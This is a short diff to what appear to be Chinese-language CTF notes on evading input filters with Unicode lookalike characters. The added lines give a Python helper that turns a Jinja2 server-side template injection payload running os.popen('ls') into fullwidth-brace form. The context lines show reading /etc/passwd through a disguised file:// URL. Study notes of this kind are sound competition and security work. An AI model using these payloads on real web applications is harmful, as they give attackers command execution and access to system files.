@@ -26,6 +26,25 @@ for h in host.split('.'):
 
 ︷︸变成{} 可以用于ssti注入
 ```
+ssti绕过替换
+```
+"""
+{ -> ︷/﹛
+} -> ︸/﹜
+' -> ＇
+, -> ，
+" -> ＂
+"""
+//此时的str即你要输入的payload
+str = '''{{a.__init__.__globals__.__builtins__.eval("__import__('os').popen('ls').read()")}}''' # 原字符串
+# 如果需要替换replace(被替换的字符,替换后的字符)
+str = str.replace('{', '︷')
+str = str.replace('}', '︸')
+str = str.replace('\'', '＇')
+str = str.replace('\"', '＂')
+
+print(str)
+```
 
 于是传入url=file://suctf.cc/etc/passwd
 可以变成传入url=file://suℂtf.cc/etc/passwd绕过过滤，最终又变回来
